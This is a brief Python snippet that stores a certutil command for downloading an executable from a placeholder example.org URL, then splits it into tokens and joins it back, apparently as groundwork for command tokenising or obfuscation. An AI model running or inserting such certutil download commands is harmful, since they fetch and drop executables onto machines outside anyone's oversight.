script = "certutil.exe -urlcache -f https://www.example.org/file.exe file.exe"

def comm_split(script):
    split_script = []
    for split in script.split():
        split_script.append(split)
    return split_script

def comm_join(split_script):
    split_script = comm_split(script)
    join_script = " ".join(split_script)
    print(join_script)